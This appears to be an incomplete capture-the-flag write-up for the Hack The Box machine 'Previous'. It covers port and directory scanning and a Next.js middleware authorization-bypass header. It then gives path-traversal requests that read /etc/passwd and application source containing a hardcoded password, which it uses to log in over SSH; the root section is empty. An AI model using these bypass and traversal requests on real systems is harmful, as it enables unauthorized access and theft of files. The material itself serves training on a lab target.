---
name: Previous
difficulty: medium
os: linux
platform: htb
date: 9999
userFlag: false
rootFlag: false

img: image_url
---

## Enumeration

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports:

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.83 -o allPorts
```
```
PORT     STATE SERVICE    REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

Next, we use options `-sV` to enable version detection and `-sC` to run default scripts against the open ports:

```bash
nmap -p22,80 -sCV 10.10.11.83 -o targeted
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://previous.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We can see that the SSH service is running on port 22 and the HTTP service is running on port 80. The HTTP service is using Nginx 1.18.0 on Ubuntu.

Nginx is doing virtual hosting redirecting users to `http://previous.htb`. We can add this domain to our `/etc/hosts`:
```bash
echo "10.10.11.83 previous.htb" | sudo tee -a /etc/hosts
```

We use `gobuster` to enumerate directories on the web server:

```bash
gobuster dir -u http://previous.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
```
```
/docs                 (Status: 307) [Size: 36] [--> /api/auth/signin?callbackUrl=%2Fdocs]
/api                  (Status: 307) [Size: 35] [--> /api/auth/signin?callbackUrl=%2Fapi]
/signin               (Status: 200) [Size: 3481]
/docsis               (Status: 307) [Size: 38] [--> /api/auth/signin?callbackUrl=%2Fdocsis]
/apis                 (Status: 307) [Size: 36] [--> /api/auth/signin?callbackUrl=%2Fapis]
```

We find a article that discusses an [authorization bypass vulnerability](https://jfrog.com/blog/cve-2025-29927-next-js-authorization-bypass/). This vulnerability allows an attacker to get through the authentication process without any credentials and access sensitive files.

We have to add the following header to all requests which require authentication:
```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

If we navigate to `http://previous.htb/docs/examples`, we find a link to download a file. We can modify the request to download the `/etc/passwd` file:
```bash
GET /api/download?example=../../../../../../../etc/passwd HTTP/1.1
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
Host: previous.htb
```
```
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```

We download the `./app/.next/routes-manifest.json` file to get more information about the application routes:
```
  dynamicRoutes": [
    {
      "page": "/api/auth/[...nextauth]",
      "regex": "^/api/auth/(.+?)(?:/)?$",
      "routeKeys": {
        "nxtPnextauth": "nxtPnextauth"
      },
      "namedRegex": "^/api/auth/(?<nxtPnextauth>.+?)(?:/)?$"
    },
```

Then we can use this information to craft our requests more effectively.

We try to read contents of authorized routes:
```
GET /api/download?example=../../../../../../../../../../../app/.next/server/pages/api/auth/[...nextauth].js 
```
```
...
authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})]
...
```

We find a function `authorize` that checks the username and password against known values.


## User Exploitation


We try to connect as the user `jeremy` with the password `MyNameIsJeremyAndILovePancakes` via ssh:
```bash
ssh jeremy@10.10.11.83
whoami
```
```
jeremy
```

We check the user flag:
```bash
cat /home/jeremy/user.txt
```
```
user flag value
```

## Root Exploitation

## Conclusion


